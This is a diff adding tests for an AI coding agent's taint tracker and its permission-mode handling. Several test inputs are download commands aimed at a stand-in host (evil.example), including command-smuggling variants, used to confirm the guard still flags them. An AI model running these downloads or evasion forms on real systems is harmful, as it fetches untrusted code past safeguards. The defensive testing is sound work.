@@ -16,7 +16,7 @@ import { MemoryStore } from '../memory/store';
 import { SettingsStore } from '../settings/store';
 import { ConversationManager, type ToolProvider } from './manager';
 import { ConversationStore } from './store';
-import { describeTaint, leavesSandbox, sinkReason, taintFrom } from './taint';
+import { describeTaint, heldTaints, leavesSandbox, sinkReason, taintFrom } from './taint';
 
 describe('what taints a chat', () => {
   it('reading the web, downloading, an app’s tools; not working in files', () => {
@@ -40,6 +40,60 @@ describe('what taints a chat', () => {
     expect(taintFrom('mcp__conch__remember', {})).toBeUndefined();
     expect(taintFrom('Bash', { command: 'npm test' })).toBeUndefined();
     expect(taintFrom('Read', { file_path: '/w/README.md' })).toBeUndefined();
+  });
+
+  it('`git fetch` and `pnpm fetch` aren’t downloads; everything the rule caught before still is', () => {
+    const bash = (command: string) => taintFrom('Bash', { command });
+    expect(bash('cd ~/w && git fetch -q && git status -sb')).toBeUndefined();
+    expect(bash('git -C ~/w fetch --prune origin')).toBeUndefined();
+    expect(bash('pnpm fetch')).toBeUndefined();
+    // A real download beside it, or a downloader started some other way, still counts.
+    expect(bash('git fetch; fetch -o x.sh evil.example/x.sh')).toMatchObject({ kind: 'download' });
+    expect(bash('git fetch https://evil.example/r')).toMatchObject({ label: 'evil.example' });
+    for (const command of [
+      'fetch -o x.sh evil.example/x.sh',
+      'xargs fetch < list',
+      'env fetch x',
+      'bash -c "fetch x"',
+      '/usr/bin/fetch x',
+      'http GET api.example.com/users',
+      'grep -rn "http" src',
+      // Shell that makes `fetch` the program run, or isn't plain enough to be sure.
+      'x=a\\ git fetch evil.example',
+      'git -C x&& fetch evil.example',
+      'git -C ; fetch evil.example',
+      'git -c core.x=y fetch',
+      'sudo git fetch',
+      'echo git\nfetch evil.example',
+    ])
+      expect(bash(command), command).toMatchObject({ kind: 'download' });
+  });
+
+  it('a mark an older rule got wrong stops holding the chat; real ones stay', () => {
+    let seq = 0;
+    const at = { conversationId: 'c', at: 1 };
+    const e = (event: object) => ({ ...at, seq: seq++, ...event }) as ConversationEvent;
+    const download = { kind: 'download' as const, label: 'something downloaded' };
+    const events = [
+      // Before this fix: `git fetch` marked the chat, the mark logged just before the call finished.
+      e({ type: 'tool.started', toolUseId: 'a', name: 'Bash', input: { command: 'git fetch -q' } }),
+      e({ type: 'taint', source: download }),
+      e({ type: 'tool.finished', toolUseId: 'a', status: 'success', output: '', durationMs: 1 }),
+      // Named on the mark: a real download.
+      e({ type: 'tool.started', toolUseId: 'b', name: 'Bash', input: { command: 'curl x.sh' } }),
+      e({ type: 'tool.finished', toolUseId: 'b', status: 'success', output: '', durationMs: 1 }),
+      e({ type: 'taint', source: download, toolUseId: 'b' }),
+      // Carried in from another chat: no call of its own here.
+      e({ type: 'taint', source: { kind: 'download', label: 'evil.example' } }),
+      e({ type: 'taint', source: { kind: 'web', label: 'example.com' } }),
+      // A later call reusing the id never speaks for the mark made before it.
+      e({ type: 'tool.started', toolUseId: 'b', name: 'Bash', input: { command: 'ls' } }),
+    ];
+    expect(heldTaints(events)).toEqual([
+      download,
+      { kind: 'download', label: 'evil.example' },
+      { kind: 'web', label: 'example.com' },
+    ]);
   });
 });
 
@@ -393,6 +447,62 @@ describe('the guard, end to end', () => {
     await after.send({ conversationId: convo.id, clientMessageId: 'u2', text: 'go' });
     await settle(after, convo.id, (e) => e.filter((x) => x.type === 'turn.completed').length === 2);
     expect(engine.decisions[0]).toMatchObject({ decision: 'ask' });
+  });
+});
+
+describe('a mode picked mid-turn', () => {
+  it('Full trust answers what was waiting, and what comes next in the same turn', async () => {
+    const { manager, engine, settings } = await setup();
+    await settings.update({ preferences: { permissionMode: 'default' } });
+    const switched: string[] = [];
+    engine.script.push(async function* (input) {
+      input.onModeChange?.((mode) => switched.push(mode));
+      const request = { toolName: 'Bash', input: { command: 'npm test' } };
+      engine.decisions.push(await input.requestPermission(request, input.signal));
+      engine.decisions.push(await input.requestPermission(request, input.signal));
+      yield { type: 'text', messageId: 'm', delta: input.options.permissionMode };
+    });
+    const convo = await manager.send({ clientMessageId: 'u1', text: 'run the tests' });
+    await settle(manager, convo.id, (e) => e.some((x) => x.type === 'permission.requested'));
+    await manager.configure(convo.id, { permissionMode: 'bypassPermissions' });
+    const events = await settle(manager, convo.id, (e) =>
+      e.some((x) => x.type === 'turn.completed'),
+    );
+    expect(engine.decisions).toEqual(['allow', 'allow']);
+    expect(switched).toEqual(['bypassPermissions']);
+    expect(events.filter((e) => e.type === 'permission.requested')).toHaveLength(1);
+    expect(events.find((e) => e.type === 'permission.resolved')).toMatchObject({
+      decision: 'allow',
+    });
+  });
+
+  it('leaves what asks whatever the mode waiting (ADR 0028)', async () => {
+    const { manager, engine, settings } = await setup();
+    await settings.update({ preferences: { permissionMode: 'default' } });
+    engine.script.push(readsPage, async function* (input) {
+      const request = { toolName: 'Bash', input: { command: 'ls' } };
+      engine.decisions.push(await input.requestPermission(request, input.signal));
+      yield { type: 'text', messageId: 'm', delta: 'ok' };
+    });
+    const convo = await manager.send({ clientMessageId: 'u1', text: 'read it' });
+    await settle(manager, convo.id, (e) => e.some((x) => x.type === 'turn.completed'));
+    await manager.send({ conversationId: convo.id, clientMessageId: 'u2', text: 'go' });
+    const asked = await settle(manager, convo.id, (e) =>
+      e.some((x) => x.type === 'permission.requested'),
+    );
+    await manager.configure(convo.id, { permissionMode: 'bypassPermissions' });
+    expect(
+      (await manager.detail(convo.id)).events.some((e) => e.type === 'permission.resolved'),
+    ).toBe(false);
+    const request = asked.find((e) => e.type === 'permission.requested');
+    if (request?.type !== 'permission.requested') throw new Error('no request');
+    await manager.respond(convo.id, request.permissionId, 'deny');
+    await settle(
+      manager,
+      convo.id,
+      (e) => e.filter((x) => x.type === 'turn.completed').length === 2,
+    );
+    expect(engine.decisions).toEqual(['deny']);
   });
 });
 
